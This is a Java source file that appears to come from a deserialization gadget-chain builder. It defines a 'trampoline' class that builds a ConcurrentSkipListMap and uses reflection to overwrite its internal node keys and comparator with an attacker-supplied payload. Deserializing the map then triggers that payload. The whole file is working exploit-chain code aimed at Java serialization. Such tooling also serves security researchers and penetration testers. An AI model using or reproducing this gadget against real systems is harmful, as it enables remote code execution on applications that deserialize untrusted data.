package org.ses.gadgetbuilder.impl.trampolines.compare;

import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.util.Comparator;
import java.util.concurrent.ConcurrentSkipListMap;

public class ConcurrentSkipListMapCompare implements CompareTrampoline {
    @Override
    public Object wrapPayload(Comparator payload, Object param1, Object param2) {

        ConcurrentSkipListMap map = new ConcurrentSkipListMap<Object,Object>();
        map.put("foo", "foo");
        map.put("bar", "bar");
        try {

            Object head = Reflections.getFieldValue(map, "head");
            Object node =  Reflections.getFieldValue(head, "node");
            Object nextNode = Reflections.getFieldValue(node, "next");

            Reflections.setFieldValue(node, "key", param1);
            Reflections.setFieldValue(nextNode, "key", param2);
            Reflections.setFieldValue(head, "node", node);
            Reflections.setFieldValue(map, "head", head);

            Reflections.setFieldValue(map, "comparator", payload);

        } catch (Exception ignored) {
            ignored.printStackTrace();
        }

        return map;
    }
}
